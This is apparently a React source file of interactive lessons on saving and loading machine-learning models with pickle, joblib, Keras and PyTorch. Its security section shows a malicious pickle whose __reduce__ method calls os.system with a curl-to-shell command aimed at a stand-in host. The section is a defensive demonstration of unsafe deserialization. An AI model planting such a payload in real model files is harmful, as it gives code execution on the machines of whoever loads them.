import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Cpu, HardDrive, FileText, Folder, Skull, ShieldCheck, Power } from 'lucide-react';
import { useStepper, Frame, StepControls, tabClass, Lesson, CodeLines, Terminal, Caption } from './VisualKit';

const COEF = [0.82, -1.14, 0.35, 1.47, -0.62, 0.09, -0.93, 0.58, 1.21, -0.27];
const HEX = ['80', '04', '95', '1f', '02', '00', '00', '8c', '1e', '73', '6b', '6c', '65', '61', '72', '6e'];

function WeightBars({ values = COEF, faded = false, small = false }) {
  return (
    <div className={`flex items-center gap-[3px] ${small ? 'h-8' : 'h-14'}`}>
      {values.map((v, i) => (
        <div key={i} className="flex-1 h-full flex flex-col justify-center">
          <motion.div
            initial={false}
            animate={{ height: `${Math.abs(v) * 55}%`, opacity: faded ? 0.15 : 1 }}
            className={`w-full rounded-sm ${v >= 0 ? 'bg-teal-400' : 'bg-violet-400'}`}
          />
        </div>
      ))}
    </div>
  );
}

function FileIcon({ name, size, filled = true, tone = 'teal' }) {
  const t = tone === 'rose' ? 'border-rose-400 text-rose-100 bg-rose-500/10' : filled ? 'border-teal-400 text-teal-100 bg-teal-500/10' : 'border-gray-700 border-dashed text-gray-500';
  return (
    <div className={`inline-flex items-center gap-2 rounded-lg border px-2.5 py-1.5 ${t}`}>
      <FileText className="w-4 h-4" />
      <div>
        <p className="font-mono text-[11px] leading-tight">{name}</p>
        {size && <p className="text-[9px] text-gray-400">{size}</p>}
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/* 1. Memory → disk → memory                                             */
/* ------------------------------------------------------------------ */

const MD_STEPS = [
  'Train the model: it learns its parameters',
  'The learned state exists only in RAM',
  'Serialize: convert the object to bytes and write a file',
  'The process stops: RAM is wiped',
  'Deserialize: rebuild the object from the file',
  'Use it again: predictions without retraining',
];

export function MemoryToDiskVisualizer() {
  const [save, setSave] = useState(true);
  return <MemoryRun key={String(save)} save={save} setSave={setSave} />;
}

function MemoryRun({ save, setSave }) {
  const stepper = useStepper(MD_STEPS.length, 1500);
  const step = stepper.index;
  const inRam = step <= 2 || (step >= 4 && save);
  const onDisk = save && step >= 2;
  const lost = !save && step >= 3;

  return (
    <Frame
      title="Serialization: from memory to disk and back"
      hint="Step through a model’s life. Then turn saving off and see what is left after the process stops."
      footer={
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <div className="flex gap-2">
            <button type="button" className={tabClass(save)} onClick={() => setSave(true)}>with serialization</button>
            <button type="button" className={tabClass(!save)} onClick={() => setSave(false)}>without</button>
          </div>
          <StepControls stepper={stepper} total={MD_STEPS.length} />
        </div>
      }
    >
      <div className="space-y-3">
        <Caption text={`${step + 1}. ${!save && step === 2 ? 'Nothing is saved…' : !save && step >= 4 ? 'Nothing to load — the model is gone.' : MD_STEPS[step]}`} />
        <div className="grid grid-cols-[1fr_auto_1fr] gap-3 items-center">
          <div className={`rounded-xl border-2 p-3 min-h-[11rem] ${step === 3 ? 'border-rose-400/60 bg-rose-500/5' : 'border-sky-400/50 bg-sky-500/5'}`}>
            <p className="flex items-center gap-1.5 text-[10px] uppercase tracking-wider text-sky-300"><Cpu className="w-3.5 h-3.5" /> RAM · Python process</p>
            <AnimatePresence mode="wait">
              {inRam ? (
                <motion.div key="model" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.6, filter: 'blur(4px)' }} className="mt-2 rounded-lg border border-gray-700 bg-gray-950 p-2 space-y-1">
                  <p className="font-mono text-[11px] text-white">model = LogisticRegression()</p>
                  <WeightBars faded={step === 0} />
                  <p className="font-mono text-[9px] text-gray-500">coef_ (10 learned weights) · intercept_ · classes_</p>
                </motion.div>
              ) : (
                <motion.div key="empty" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-6 text-center text-[11px] text-gray-500">
                  {step === 3 ? <><Power className="w-6 h-6 mx-auto mb-1 text-rose-300" />process stopped · memory released</> : lost ? <>NameError: name 'model' is not defined<br />→ retrain from scratch</> : 'empty'}
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          <div className="w-16 relative h-10">
            {save && (step === 2 || step === 4) && (
              <div className="absolute inset-0 overflow-hidden">
                {HEX.slice(0, 6).map((h, i) => (
                  <motion.span
                    key={`${step}-${i}`}
                    initial={{ x: step === 2 ? -10 : 60, opacity: 0 }}
                    animate={{ x: step === 2 ? 60 : -10, opacity: [0, 1, 1, 0] }}
                    transition={{ duration: 1.2, delay: i * 0.15, repeat: Infinity, repeatDelay: 0.3 }}
                    className="absolute top-3 font-mono text-[9px] text-amber-200"
                  >
                    {h}
                  </motion.span>
                ))}
              </div>
            )}
            <p className="absolute -bottom-4 w-full text-center text-[9px] text-gray-500">{step === 2 && save ? 'dump →' : step === 4 && save ? '← load' : ''}</p>
          </div>

          <div className="rounded-xl border-2 border-amber-400/40 bg-amber-500/5 p-3 min-h-[11rem]">
            <p className="flex items-center gap-1.5 text-[10px] uppercase tracking-wider text-amber-300"><HardDrive className="w-3.5 h-3.5" /> Disk</p>
            <div className="mt-3 space-y-2">
              {onDisk ? (
                <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-1.5">
                  <FileIcon name="logistic_regression_model.pkl" size="model artifact · ~1 KB" />
                  <p className="font-mono text-[9px] text-gray-500 break-all">{HEX.join(' ')} …</p>
                  <p className="text-[10px] text-emerald-300">survives restarts</p>
                </motion.div>
              ) : (
                <FileIcon name="(no file)" filled={false} />
              )}
            </div>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-2 text-[11px]">
          <div className={`rounded-lg border p-2 ${step === 2 ? 'border-teal-400 bg-teal-500/10' : 'border-gray-800'}`}>
            <p className="font-semibold text-white">Serialization</p>
            <p className="text-gray-400">in-memory object → format that can be stored on disk or transmitted</p>
          </div>
          <div className={`rounded-lg border p-2 ${step === 4 ? 'border-teal-400 bg-teal-500/10' : 'border-gray-800'}`}>
            <p className="font-semibold text-white">Deserialization</p>
            <p className="text-gray-400">stored format → the object reconstructed in memory</p>
          </div>
        </div>
      </div>
    </Frame>
  );
}

/* ------------------------------------------------------------------ */
/* 2. Saving a document analogy                                          */
/* ------------------------------------------------------------------ */

const DOC_STEPS = ['You work: the state is in the open app', 'Save → a file on disk (serialize)', 'Close the application', 'Open the file later (deserialize)'];

const MAPPING = [
  ['Your text', 'Learned parameters', 'coef_, intercept_'],
  ['Layout & formatting', 'Structure', 'LogisticRegression(C=1.0, max_iter=100)'],
  ['Other document info', 'Other info captured in training', 'classes_, n_features_in_'],
];

export function DocumentAnalogyVisualizer() {
  const stepper = useStepper(DOC_STEPS.length, 1500);
  const step = stepper.index;
  const [row, setRow] = useState(0);
  const open = step !== 2;

  const Pane = ({ kind }) => (
    <div className="rounded-xl border border-gray-700 bg-gray-950 p-2 min-h-[9rem] space-y-2">
      <p className="text-[10px] uppercase tracking-wider text-gray-500">{kind === 'doc' ? 'Document editor' : 'ML model'}</p>
      <AnimatePresence mode="wait">
        {open ? (
          <motion.div key="open" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="space-y-1.5">
            {kind === 'doc' ? (
              <div className="rounded bg-white/90 p-2 space-y-1">
                <p className={`text-[11px] font-bold text-gray-900 ${row === 1 ? 'ring-2 ring-teal-400 rounded' : ''}`}>Quarterly report</p>
                <p className={`text-[10px] text-gray-700 ${row === 0 ? 'ring-2 ring-teal-400 rounded' : ''}`}>Revenue grew 12% thanks to…</p>
                <p className={`text-[8px] text-gray-500 ${row === 2 ? 'ring-2 ring-teal-400 rounded' : ''}`}>author: you · 2 pages</p>
              </div>
            ) : (
              <div className="rounded border border-gray-700 p-2 space-y-1">
                <p className={`font-mono text-[10px] text-white ${row === 1 ? 'ring-2 ring-teal-400 rounded' : ''}`}>LogisticRegression(C=1.0)</p>
                <div className={row === 0 ? 'ring-2 ring-teal-400 rounded' : ''}><WeightBars small /></div>
                <p className={`font-mono text-[8px] text-gray-500 ${row === 2 ? 'ring-2 ring-teal-400 rounded' : ''}`}>classes_=[0, 1] · n_features_in_=10</p>
              </div>
            )}
            {step === 3 && <p className="text-[10px] text-emerald-300">exactly the same as before — nothing lost</p>}
          </motion.div>
        ) : (
          <motion.p key="closed" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center text-[11px] text-gray-500 pt-6">closed</motion.p>
        )}
      </AnimatePresence>
      {step >= 1 && <FileIcon name={kind === 'doc' ? 'report.docx' : 'model.pkl'} size="on disk" />}
    </div>
  );

  return (
    <Frame title="Like saving a document you’re working on" hint="Step through saving, closing and reopening. Click a row below to match document parts to model parts." footer={<StepControls stepper={stepper} total={DOC_STEPS.length} />}>
      <div className="space-y-3">
        <Caption text={`${step + 1}. ${DOC_STEPS[step]}`} />
        <div className="grid grid-cols-2 gap-3">
          <Pane kind="doc" />
          <Pane kind="model" />
        </div>
        <div className="rounded-xl border border-gray-700 overflow-hidden">
          <p className="px-2 py-1 text-[9px] uppercase tracking-wider text-gray-500 border-b border-gray-800">“saving the work” means preserving…</p>
          {MAPPING.map(([d, m, ex], i) => (
            <button key={d} type="button" onClick={() => setRow(i)} className={`w-full grid grid-cols-[1fr_auto_1fr] gap-2 px-2 py-1.5 text-left text-[11px] ${row === i ? 'bg-teal-500/15' : 'hover:bg-gray-800'}`}>
              <span className="text-gray-300">{d}</span>
              <span className="text-gray-600">↔</span>
              <span>
                <span className="text-white">{m}</span>
                <span className="block font-mono text-[9px] text-teal-200">{ex}</span>
              </span>
            </button>
          ))}
        </div>
      </div>
    </Frame>
  );
}

/* ------------------------------------------------------------------ */
/* 4. pickle vs joblib                                                   */
/* ------------------------------------------------------------------ */

const OBJECTS = [
  { id: 'dict', label: 'a settings dict', arrays: 0, note: 'Plain Python data — pickle handles it perfectly.' },
  { id: 'cls', label: 'a custom Python class', arrays: 1, note: 'Any importable class instance can be pickled.' },
  { id: 'rf', label: 'trained RandomForest', arrays: 6, note: 'Hundreds of trees stored as large NumPy arrays — joblib’s specialty.' },
];

export function LibraryCompareVisualizer() {
  const [obj, setObj] = useState('rf');
  const o = OBJECTS.find((x) => x.id === obj);

  return (
    <Frame title="Two common serialization libraries" hint="Pick an object to serialize and compare how the two libraries approach it.">
      <div className="space-y-3">
        <div className="flex flex-wrap gap-1.5">
          {OBJECTS.map((x) => (
            <button key={x.id} type="button" className={tabClass(obj === x.id)} onClick={() => setObj(x.id)}>
              {x.label}
            </button>
          ))}
        </div>
        <div className="grid md:grid-cols-2 gap-3">
          {[
            { name: 'pickle', tag: 'built into Python', lines: ['import pickle', "with open('m.pkl', 'wb') as f:", '    pickle.dump(obj, f)'], big: 'every array goes through the generic pickle stream' },
            { name: 'joblib', tag: 'installed alongside scikit-learn', lines: ['import joblib', "joblib.dump(obj, 'm.joblib')", ''], big: 'large NumPy arrays are written efficiently as raw buffers' },
          ].map((lib) => (
            <div key={lib.name} className="rounded-xl border border-gray-700 p-3 space-y-2">
              <div className="flex items-center justify-between">
                <p className="font-mono text-sm text-white">{lib.name}</p>
                <span className="text-[9px] text-gray-400">{lib.tag}</span>
              </div>
              <CodeLines lines={lib.lines.filter(Boolean)} />
              <div className="rounded-lg bg-black/50 p-2 space-y-1">
                <p className="text-[9px] uppercase tracking-wider text-gray-500">what gets written</p>
                <div className="flex flex-wrap gap-1">
                  <span className="px-1.5 py-0.5 rounded bg-gray-700 font-mono text-[9px] text-gray-200">object structure</span>
                  {Array.from({ length: o.arrays }).map((_, i) => (
                    <motion.span
                      key={`${obj}-${i}`}
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: i * 0.08 }}
                      className={`px-1.5 py-0.5 rounded font-mono text-[9px] ${lib.name === 'joblib' ? 'bg-teal-500/30 text-teal-100' : 'bg-violet-500/25 text-violet-100'}`}
                    >
                      ndarray[{(i + 1) * 1000}]
                    </motion.span>
                  ))}
                </div>
                {o.arrays > 1 && <p className="text-[10px] text-gray-400">{lib.big}</p>}
              </div>
            </div>
          ))}
        </div>
        <p className="text-[11px] text-gray-300">{o.note}</p>
        <Lesson title="Rule of thumb">
          pickle can serialize almost any Python object, including trained scikit-learn models. joblib provides drop-in replacements (<span className="font-mono">joblib.dump</span> /{' '}
          <span className="font-mono">joblib.load</span>) that are often more efficient for objects containing large NumPy arrays — very common in ML models.
        </Lesson>
      </div>
    </Frame>
  );
}

/* ------------------------------------------------------------------ */
/* 5. Using pickle, step by step                                         */
/* ------------------------------------------------------------------ */

export const PICKLE_CODE = [
  'import pickle',
  'from sklearn.linear_model import LogisticRegression',
  'from sklearn.datasets import make_classification',
  'from sklearn.model_selection import train_test_split',
  '',
  '# --- Training a Dummy Model (Illustrative) ---',
  'X, y = make_classification(n_samples=100, n_features=10, random_state=42)',
  'X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)',
  '',
  'model = LogisticRegression()',
  'model.fit(X_train, y_train)',
  "# --- Model is now 'trained' ---",
  '',
  '# Define the filename for the saved model',
  "model_filename = 'logistic_regression_model.pkl'",
  '',
  '# Serialize (save) the model to a file',
  "# 'wb' mode opens the file for writing in binary mode",
  "with open(model_filename, 'wb') as file:",
  '    pickle.dump(model, file)',
  '',
  'print(f"Model saved to {model_filename}")',
  '',
  '# --- Later, in a different script or session ---',
  '',
  '# Deserialize (load) the model from the file',
  "# 'rb' mode opens the file for reading in binary mode",
  'try:',
  "    with open(model_filename, 'rb') as file:",
  '        loaded_model = pickle.load(file)',
  '    print(f"Model loaded from {model_filename}")',
  '    # Now you can use loaded_model to make predictions',
  '    # Example: predictions = loaded_model.predict(X_test)',
  'except FileNotFoundError:',
  '    print(f"Error: Model file \'{model_filename}\' not found.")',
  'except Exception as e:',
  '    print(f"Error loading model: {e}")',
];

const PK_STEPS = [
  { t: 'Generate data (100 samples × 10 features) and split 80/20', lines: [6, 7] },
  { t: 'Fit LogisticRegression — the model learns its weights', lines: [9, 10] },
  { t: 'Choose a filename for the artifact', lines: [14] },
  { t: "open(..., 'wb') + pickle.dump: bytes written to the file", lines: [18, 19, 21] },
  { t: 'Later, a new session: the old model object is gone', lines: [23] },
  { t: "open(..., 'rb') + pickle.load: object rebuilt from bytes", lines: [27, 28, 29, 30] },
];

export function PickleWalkthroughVisualizer() {
  const [scenario, setScenario] = useState('ok');
  return <PickleRun key={scenario} scenario={scenario} setScenario={setScenario} />;
}

function PickleRun({ scenario, setScenario }) {
  const stepper = useStepper(PK_STEPS.length, 1400);
  const step = stepper.index;
  const s = PK_STEPS[step];
  const loadLines = scenario === 'ok' ? [27, 28, 29, 30] : scenario === 'missing' ? [27, 28, 33, 34] : [27, 28, 29, 35, 36];

  const logs = [];
  if (step >= 3) logs.push({ text: 'Model saved to logistic_regression_model.pkl', kind: 'ok' });
  if (step >= 5) {
    if (scenario === 'ok') logs.push({ text: 'Model loaded from logistic_regression_model.pkl', kind: 'ok' });
    if (scenario === 'missing') logs.push({ text: "Error: Model file 'logistic_regression_model.pkl' not found.", kind: 'err' });
    if (scenario === 'corrupt') logs.push({ text: 'Error loading model: pickle data was truncated', kind: 'err' });
  }

  return (
    <Frame
      title="Saving and loading with pickle"
      hint="Step through the script. Then choose what happened to the file before the later session."
      footer={
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <div className="flex flex-wrap gap-1.5">
            {[
              ['ok', 'file intact'],
              ['missing', 'file deleted'],
              ['corrupt', 'file truncated'],
            ].map(([id, l]) => (
              <button key={id} type="button" className={tabClass(scenario === id)} onClick={() => setScenario(id)}>
                {l}
              </button>
            ))}
          </div>
          <StepControls stepper={stepper} total={PK_STEPS.length} />
        </div>
      }
    >
      <div className="space-y-3">
        <Caption text={`${step + 1}. ${s.t}`} />
        <div className="grid md:grid-cols-[1.35fr_1fr] gap-3">
          <div className="max-h-80 overflow-auto custom-scroll rounded-xl">
            <CodeLines lines={PICKLE_CODE} active={step === 5 ? loadLines : s.lines} title="save_and_load.py" />
          </div>
          <div className="space-y-2">
            <div className="rounded-xl border border-sky-400/40 p-2 space-y-1">
              <p className="text-[9px] uppercase tracking-wider text-sky-300">memory</p>
              {step >= 1 && step !== 4 && !(step === 5 && scenario !== 'ok') ? (
                <>
                  <p className="font-mono text-[10px] text-white">{step === 5 ? 'loaded_model' : 'model'}</p>
                  <WeightBars small />
                </>
              ) : (
                <p className="text-[10px] text-gray-500">{step === 0 ? 'X_train (80×10), X_test (20×10)' : step === 4 ? 'new session — nothing in memory' : 'loaded_model was never created'}</p>
              )}
            </div>
            <div className="rounded-xl border border-amber-400/40 p-2 space-y-1">
              <p className="text-[9px] uppercase tracking-wider text-amber-300">disk</p>
              {step >= 3 && !(step >= 5 && scenario === 'missing') ? (
                <>
                  <FileIcon name="logistic_regression_model.pkl" size={scenario === 'corrupt' && step >= 4 ? 'truncated!' : 'binary'} tone={scenario === 'corrupt' && step >= 4 ? 'rose' : 'teal'} />
                  {step === 3 && (
                    <p className="font-mono text-[9px] text-amber-100 break-all">
                      b'\x80\x04\x95…\x8c\x1esklearn.linear_model._logistic\x94\x8c\x12LogisticRegression…'
                    </p>
                  )}
                </>
              ) : (
                <p className="text-[10px] text-gray-500">{step >= 5 && scenario === 'missing' ? 'file not found' : 'no file yet'}</p>
              )}
            </div>
            <Terminal title="python save_and_load.py" lines={logs.length ? logs : [{ text: '…', kind: 'dim' }]} />
            {step === 3 && <p className="text-[10px] text-gray-400">Note the bytes: pickle stores a reference to the class (module + name) plus its data — not the class’s code.</p>}
          </div>
        </div>
      </div>
    </Frame>
  );
}

/* ------------------------------------------------------------------ */
/* 6. Security: loading a pickle can run code                            */
/* ------------------------------------------------------------------ */

const OPS = {
  trusted: [
    { op: 'PROTO 4', note: 'pickle protocol' },
    { op: "GLOBAL 'sklearn.linear_model._logistic LogisticRegression'", note: 'find the class' },
    { op: 'EMPTY_TUPLE · NEWOBJ', note: 'create an empty instance' },
    { op: "BUILD {'coef_': ..., 'intercept_': ...}", note: 'restore its attributes' },
    { op: 'STOP', note: 'return the model' },
  ],
  evil: [
    { op: 'PROTO 4', note: 'pickle protocol' },
    { op: "GLOBAL 'os system'", note: 'find a function… os.system' },
    { op: "UNICODE 'curl http://evil.example/x.sh | sh'", note: 'push an argument' },
    { op: 'TUPLE1 · REDUCE', note: 'CALL os.system(argument)' },
    { op: 'STOP', note: 'too late' },
  ],
};

export function PickleSecurityVisualizer() {
  const [src, setSrc] = useState('evil');
  return <SecurityRun key={src} src={src} setSrc={setSrc} />;
}

function SecurityRun({ src, setSrc }) {
  const ops = OPS[src];
  const stepper = useStepper(ops.length, 1100);
  const step = stepper.index;
  const fired = src === 'evil' && step >= 3;

  return (
    <Frame
      title="pickle.load executes instructions"
      hint="A pickle file is a small program that rebuilds objects. Step through loading a file you made, then one from an unknown source."
      footer={
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <div className="flex gap-2">
            <button type="button" className={tabClass(src === 'trusted')} onClick={() => setSrc('trusted')}>your own model.pkl</button>
            <button type="button" className={tabClass(src === 'evil')} onClick={() => setSrc('evil')}>“model.pkl” from a random download</button>
          </div>
          <StepControls stepper={stepper} total={ops.length} showPlay />
        </div>
      }
    >
      <div className="space-y-3">
        <div className="grid md:grid-cols-2 gap-3">
          <div className="space-y-1">
            <p className="text-[10px] uppercase tracking-wider text-gray-500">pickle instructions (pickletools view)</p>
            <div className="rounded-xl border border-gray-700 bg-gray-950 p-2 space-y-0.5">
              {ops.map((o, i) => (
                <motion.div key={o.op} animate={{ opacity: i <= step ? 1 : 0.3 }} className={`rounded px-1.5 py-1 ${i === step ? (src === 'evil' && i === 3 ? 'bg-rose-500/30' : 'bg-teal-500/20') : ''}`}>
                  <p className="font-mono text-[10px] text-white break-all">{o.op}</p>
                  <p className="text-[9px] text-gray-500">{o.note}</p>
                </motion.div>
              ))}
            </div>
          </div>
          <div className="space-y-2">
            <p className="text-[10px] uppercase tracking-wider text-gray-500">your server</p>
            <motion.div animate={{ borderColor: fired ? '#fb7185' : '#374151' }} className="rounded-xl border-2 p-3 min-h-[8rem] flex flex-col items-center justify-center text-center gap-2">
              {fired ? (
                <>
                  <Skull className="w-8 h-8 text-rose-300" />
                  <p className="text-[11px] text-rose-100">A shell command ran with your server’s permissions — before pickle.load even returned.</p>
                </>
              ) : src === 'trusted' && step === ops.length - 1 ? (
                <>
                  <ShieldCheck className="w-8 h-8 text-emerald-300" />
                  <p className="text-[11px] text-emerald-100">LogisticRegression rebuilt. Safe because you created the file.</p>
                </>
              ) : (
                <p className="text-[11px] text-gray-500">loading…</p>
              )}
            </motion.div>
            {src === 'evil' && (
              <div className="space-y-1">
                <p className="text-[10px] text-gray-500">how such a file is made:</p>
                <CodeLines lines={['class Payload:', '    def __reduce__(self):', '        return (os.system, ("curl http://evil.example/x.sh | sh",))', '', 'pickle.dump(Payload(), open("model.pkl", "wb"))']} active={step >= 3 ? [1, 2] : []} />
              </div>
            )}
          </div>
        </div>
        <Lesson title="Security rule">
          Never load a pickle file from an untrusted or unauthenticated source — it can contain malicious code. joblib uses pickle underneath, so it shares the same risk.
        </Lesson>
      </div>
    </Frame>
  );
}

/* ------------------------------------------------------------------ */
/* 7. Using joblib                                                       */
/* ------------------------------------------------------------------ */

const DIFF = [
  { p: 'import pickle', j: 'import joblib', kind: 'change' },
  { p: "model_filename = 'logistic_regression_model.pkl'", j: "model_filename_joblib = 'logistic_regression_model.joblib'", kind: 'change' },
  { p: "with open(model_filename, 'wb') as file:", j: null, kind: 'remove' },
  { p: '    pickle.dump(model, file)', j: 'joblib.dump(model, model_filename_joblib)', kind: 'change' },
  { p: "with open(model_filename, 'rb') as file:", j: null, kind: 'remove' },
  { p: '    loaded_model = pickle.load(file)', j: 'loaded_model_joblib = joblib.load(model_filename_joblib)', kind: 'change' },
  { p: 'except FileNotFoundError: / except Exception as e:', j: 'except FileNotFoundError: / except Exception as e:', kind: 'same' },
];

export function JoblibVisualizer() {
  const stepper = useStepper(DIFF.length, 900);
  const step = stepper.index;

  return (
    <Frame title="joblib: the same idea, a simpler call" hint="Step through the lines that change when you switch the pickle script to joblib." footer={<StepControls stepper={stepper} total={DIFF.length} />}>
      <div className="space-y-3">
        <div className="grid grid-cols-2 gap-2 text-[9px] uppercase tracking-wider text-gray-500">
          <span>pickle version</span>
          <span>joblib version</span>
        </div>
        <div className="space-y-1">
          {DIFF.map((d, i) => (
            <motion.div key={d.p} animate={{ opacity: i <= step ? 1 : 0.25 }} className={`grid grid-cols-2 gap-2 rounded ${i === step ? 'ring-1 ring-teal-400/60' : ''}`}>
              <span className={`font-mono text-[10px] px-1.5 py-1 rounded ${d.kind === 'same' ? 'text-gray-400' : 'bg-rose-500/10 text-rose-100'}`}>{d.p}</span>
              <span className={`font-mono text-[10px] px-1.5 py-1 rounded ${d.kind === 'same' ? 'text-gray-400' : d.j ? 'bg-emerald-500/10 text-emerald-100' : 'text-gray-600 italic'}`}>{d.j ?? '(not needed — joblib opens the file itself)'}</span>
            </motion.div>
          ))}
        </div>
        <div className="flex items-center gap-3 flex-wrap">
          <FileIcon name="logistic_regression_model.pkl" size="pickle" />
          <FileIcon name="logistic_regression_model.joblib" size="joblib" />
        </div>
        <Lesson title="Why joblib for scikit-learn">
          joblib handles large NumPy arrays more efficiently, potentially giving smaller files and faster loads than pickle. You pass a filename instead of an open file object. For most
          scikit-learn use cases, joblib is the recommended choice. (<span className="font-mono">joblib.dump(model, path, compress=3)</span> also trades a little CPU for a smaller file.)
        </Lesson>
      </div>
    </Frame>
  );
}

/* ------------------------------------------------------------------ */
/* 8. Library-specific formats                                           */
/* ------------------------------------------------------------------ */

export function FrameworkFormatsVisualizer() {
  const [fw, setFw] = useState('torch');
  const [torchMode, setTorchMode] = useState('state');
  const [kerasMode, setKerasMode] = useState('h5');

  return (
    <Frame
      title="Native formats of deep learning frameworks"
      hint="Compare what each framework writes and what you need to load it back."
      footer={
        <div className="flex gap-2">
          <button type="button" className={tabClass(fw === 'keras')} onClick={() => setFw('keras')}>TensorFlow / Keras</button>
          <button type="button" className={tabClass(fw === 'torch')} onClick={() => setFw('torch')}>PyTorch</button>
        </div>
      }
    >
      <AnimatePresence mode="wait">
        <motion.div key={fw} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="space-y-3">
          {fw === 'keras' ? (
            <>
              <div className="flex gap-2">
                <button type="button" className={`${tabClass(kerasMode === 'h5')} font-mono`} onClick={() => setKerasMode('h5')}>model.save("model.h5")</button>
                <button type="button" className={`${tabClass(kerasMode === 'saved')} font-mono`} onClick={() => setKerasMode('saved')}>SavedModel directory</button>
              </div>
              <div className="grid md:grid-cols-2 gap-3">
                <div className="rounded-xl border border-gray-700 bg-gray-950 p-2 font-mono text-[11px] space-y-0.5">
                  {kerasMode === 'h5' ? (
                    <p className="flex items-center gap-1 text-amber-200"><FileText className="w-3.5 h-3.5" /> model.h5 <span className="text-gray-500">(one HDF5 file)</span></p>
                  ) : (
                    <>
                      <p className="flex items-center gap-1 text-amber-200"><Folder className="w-3.5 h-3.5" /> my_model/</p>
                      <p className="pl-5 text-gray-300">saved_model.pb</p>
                      <p className="flex items-center gap-1 pl-4 text-gray-300"><Folder className="w-3 h-3" /> variables/</p>
                      <p className="pl-9 text-gray-400">variables.data-00000-of-00001</p>
                      <p className="pl-9 text-gray-400">variables.index</p>
                      <p className="flex items-center gap-1 pl-4 text-gray-300"><Folder className="w-3 h-3" /> assets/</p>
                    </>
                  )}
                </div>
                <div className="space-y-1">
                  {['model weights', 'model architecture', 'training configuration (optimizer, loss)'].map((x, i) => (
                    <motion.div key={x} initial={{ opacity: 0, x: 8 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.1 }} className="rounded-lg border border-emerald-400/40 bg-emerald-500/10 px-2 py-1 text-[11px] text-emerald-100">
                      ✓ {x}
                    </motion.div>
                  ))}
                </div>
              </div>
              <CodeLines lines={['model.save("model.h5")', 'model = tf.keras.models.load_model("model.h5")']} active={[1]} />
              <p className="text-[10px] text-gray-500">In Keras 3 the recommended format is a single <span className="font-mono">.keras</span> file; .h5 is the legacy format.</p>
            </>
          ) : (
            <>
              <div className="flex gap-2">
                <button type="button" className={`${tabClass(torchMode === 'full')} font-mono`} onClick={() => setTorchMode('full')}>torch.save(model, PATH)</button>
                <button type="button" className={`${tabClass(torchMode === 'state')} font-mono`} onClick={() => setTorchMode('state')}>torch.save(model.state_dict(), PATH)</button>
              </div>
              <div className="grid md:grid-cols-2 gap-3">
                <div className="rounded-xl border border-gray-700 bg-gray-950 p-2 space-y-1">
                  <p className="flex items-center gap-1 font-mono text-[11px] text-amber-200"><FileText className="w-3.5 h-3.5" /> model.pt</p>
                  {torchMode === 'full' ? (
                    <>
                      <div className="rounded border border-violet-400/40 bg-violet-500/10 px-1.5 py-1 font-mono text-[10px] text-violet-100">reference to class MyNet (module path)</div>
                      <div className="rounded border border-teal-400/40 bg-teal-500/10 px-1.5 py-1 font-mono text-[10px] text-teal-100">all layers + weights (pickled)</div>
                    </>
                  ) : (
                    <div className="rounded border border-teal-400/40 bg-teal-500/10 px-1.5 py-1 font-mono text-[10px] text-teal-100 space-y-0.5">
                      <p>OrderedDict(</p>
                      <p className="pl-3">'fc1.weight': Tensor[64, 10],</p>
                      <p className="pl-3">'fc1.bias': Tensor[64],</p>
                      <p className="pl-3">'fc2.weight': Tensor[2, 64],</p>
                      <p className="pl-3">'fc2.bias': Tensor[2]</p>
                      <p>)</p>
                    </div>
                  )}
                </div>
                <CodeLines
                  title="loading"
                  lines={
                    torchMode === 'full'
                      ? ['# the MyNet class must still be importable', 'model = torch.load(PATH, weights_only=False)', 'model.eval()']
                      : ['model = MyNet()          # you build the architecture', 'model.load_state_dict(torch.load(PATH))', 'model.eval()']
                  }
                  active={[1]}
                />
              </div>
              <p className="text-[11px] text-gray-300">
                {torchMode === 'full'
                  ? 'Saves the entire model object. Convenient, but tied to your exact code layout.'
                  : 'Saves only the learned parameters. Often preferred for flexibility: your code defines the architecture, the file supplies the numbers.'}
              </p>
              <p className="text-[10px] text-gray-500">Since PyTorch 2.6, torch.load defaults to weights_only=True, so loading a full pickled model needs weights_only=False (only for trusted files).</p>
            </>
          )}
          <Lesson title="Prefer native mechanisms">
            Framework formats are optimized for their own structures and often handle compatibility across versions more gracefully than pickle or joblib.
          </Lesson>
        </motion.div>
      </AnimatePresence>
    </Frame>
  );
}

